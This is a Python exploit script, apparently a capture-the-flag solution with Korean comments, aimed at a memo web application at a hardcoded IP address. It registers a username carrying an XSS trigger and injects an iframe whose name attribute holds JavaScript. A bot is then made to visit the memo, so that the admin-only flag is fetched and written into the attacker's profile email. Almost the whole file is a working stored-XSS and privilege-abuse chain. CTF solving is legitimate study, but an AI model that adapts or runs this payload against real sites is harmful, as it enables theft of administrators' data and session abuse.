import requests, re, time

def get_flag(data: str, prefix: str) -> str:
    return next(iter(re.findall(rf"{prefix}\{{.*?\}}", data)), "")

def solution(url: str, bot_url: str, prefix: str) -> str:
    with requests.Session() as ses:
        # 1. username에 15자짜리 XSS 트리거 삽입 (max=20자 제한 통과)
        xss_username = '");eval(name);//'  # 16자

        ses.post(f"{url}register", data={
            "username": xss_username,
            "email": "attacker@evil.com",
            "password": "Password123!"
        })

        # 2. 로그인 후 my_id 획득
        r = ses.post(f"{url}login", data={
            "usernameOrEmail": "attacker@evil.com",
            "password": "Password123!"
        }, allow_redirects=True)
        # 리다이렉트 URL 또는 응답에서 ID 추출
        my_id = re.search(r'/profile/(\d+)', r.url or "")
        if not my_id:
            # 프로필 페이지에서 ID 찾기
            profile_r = ses.get(f"{url}profile/1", allow_redirects=True)
            my_id_match = re.search(r'/profile/(\d+)', ses.get(url, allow_redirects=True).url)
            # 세션에서 내 profile 링크 찾기
            for resp_url in [r.url]:
                my_id = re.search(r'/profile/(\d+)', resp_url or "")
                if my_id:
                    break
        my_id = my_id.group(1) if my_id else "2"  # admin=1 이므로 우리는 보통 2

        # 3. top memo 생성
        r_top = ses.post(f"{url}memo/create",
                         json={"title": "t", "content": "t", "parentMemoId": None})
        top_id = r_top.json()["id"]

        # 4. child memo 생성 (th:utext → HTML injection)
        #    iframe name 속성에 실제 XSS 페이로드 (길이 제한 없음)
        js_payload = (
            f"fetch('/admin/flag')"
            f".then(r=>r.json())"
            f".then(d=>fetch('/profile/update/{my_id}',{{"
            f"method:'POST',"
            f"headers:{{'Content-Type':'application/x-www-form-urlencoded'}},"
            f"body:'email='+encodeURIComponent(d.flag||d)"
            f"}}))"
        )
        iframe_html = f'<iframe name="{js_payload}" src="/profile/{my_id}" style="width:0;height:0;border:0"></iframe>'

        r_child = ses.post(f"{url}memo/create",
                           json={"title": "c", "content": iframe_html, "parentMemoId": top_id})
        child_id = r_child.json()["id"]

        # 5. bot에게 child memo 방문 요청 (UUID/UUID 형식)
        requests.post(f"{bot_url}visit", data={"path": f"{top_id}/{child_id}"})
        time.sleep(5)

        # 6. 내 profile에서 email(=flag) 읽기
        flag = get_flag(ses.get(f"{url}profile/{my_id}").text, prefix)
    return flag

if __name__ == "__main__":
    url = "http://43.200.44.36:8080/"
    bot_url = "http://43.200.44.36:3000/"
    prefix = "ENKI"
    print(solution(url, bot_url, prefix))